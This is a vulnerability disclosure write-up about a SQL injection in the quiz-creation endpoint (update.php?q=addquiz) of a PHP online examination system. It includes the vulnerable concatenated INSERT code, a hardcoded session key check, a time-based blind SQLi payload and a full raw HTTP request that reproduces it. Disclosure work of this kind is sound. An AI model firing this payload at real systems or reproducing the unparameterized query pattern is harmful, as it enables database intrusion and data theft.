# SQL Injection Vulnerability in `update.php` of the Online Examination System

The quiz creation function of the Online Examination System is handled by `update.php?q=addquiz`. The front-end "Add Quiz" form in `dash.php` submits user-controlled fields to this endpoint through a `POST` request. In the backend code, `update.php:52-58` directly reads the `name`, `total`, `right`, `wrong`, `time`, `tag`, and `desc` parameters from user input, and `update.php:60` concatenates them into an `INSERT` statement:

```php
$name = $_POST['name'];
$name= ucwords(strtolower($name));
$total = $_POST['total'];
$sahi = $_POST['right'];
$wrong = $_POST['wrong'];
$time = $_POST['time'];
$tag = $_POST['tag'];
$desc = $_POST['desc'];
$id=uniqid();
$q3=mysqli_query($con,"INSERT INTO quiz VALUES  ('$id','$name' , '$sahi' , '$wrong','$total','$time' ,'$desc','$tag', NOW() ,'$email')");
```

Because the application does not use parameterized queries or effective input sanitization, an attacker can inject malicious SQL through the `name` parameter, resulting in an SQL injection vulnerability. Based on the provided request packet, this issue can be reproduced through a time-based blind SQL injection payload.

This endpoint is not publicly accessible. It requires an authenticated teacher session because the vulnerable branch is only executed when `$_SESSION['key'] == 'prasanth123'`.

## Impact of the SQL Injection Vulnerability

An attacker with a valid teacher session can use this vulnerability to probe the backend database through the quiz creation feature and confirm SQL injection. Once confirmed, the attacker may further extract sensitive data, enumerate tables and columns, or interfere with quiz-related records. In practice, this can affect the confidentiality and integrity of exam content and stored application data.

## Payload

Injection parameter: `name`

Injected value:

```text
11'and(select*from(select+sleep(10))a/**/union/**/select+1)='
```

Request method: `POST`

Request path: `/update.php?q=addquiz`

Raw request:

```http
POST /update.php?q=addquiz HTTP/1.1
Host: project1
Content-Length: 110
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0
Origin: http://project1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://project1/dash.php?q=4
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=2347fp9qoucglmem34csap1fbp
Connection: keep-alive

name=11'and(select*from(select+sleep(10))a/**/union/**/select+1)='&total=1&right=1&wrong=1&time=1&tag=1&desc=1
```

If the application response is delayed by about 10 seconds after sending the request, it indicates that the `name` parameter is likely vulnerable to time-based blind SQL injection.

## Sources Download



```
- [Online Examination In PHP With Source Code - Source Code & Projects](https://code-projects.org/online-examination-in-php-with-source-code/)
```

[Online Examination In PHP With Source Code - Source Code & Projects](https://code-projects.org/online-examination-in-php-with-source-code/)





![image-20260604113532768](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260604113532768.png)
